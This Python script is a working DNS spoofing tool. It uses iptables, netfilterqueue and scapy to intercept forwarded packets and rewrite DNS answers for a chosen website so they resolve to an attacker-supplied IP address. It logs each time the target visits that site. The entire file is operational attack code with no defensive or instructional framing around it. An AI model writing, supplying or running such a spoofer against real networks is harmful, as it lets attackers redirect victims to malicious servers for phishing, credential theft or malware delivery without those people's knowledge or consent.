import netfilterqueue,subprocess
from scapy.all import *

def set_global(web,ip):
    global website,ipAddr
    website = web   
    ipAddr = ip

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        #print(qname)
        if website.encode() in qname :
            print("Target is visiting " + qname.decode("utf-8"))
            answer = DNSRR(rrname = qname , rdata=ipAddr)
            scapy_packet[DNS].an = answer
            #print("website: " + str(qname) + "ip: " + str(scapy_packet[DNS].an))
            scapy_packet[DNS].ancount = 1
            del scapy_packet[IP].chksum
            del scapy_packet[IP].len
            del scapy_packet[UDP].chksum
            del scapy_packet[UDP].len
            packet.set_payload(bytes(scapy_packet))
    packet.accept()
    

def start():
    # subprocess.call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0',shell=True)
    # subprocess.call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0',shell=True)
    subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num 0',shell=True)
    print('[+] iptables configured')
    print('[+] DNS spoofing started')
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    try:
        queue.run()
    except KeyboardInterrupt:
        subprocess.call('iptables --flush',shell=True)
        print('\n[+] iptables flushed.')
        print('[+] DNS spoofing stopped. ')


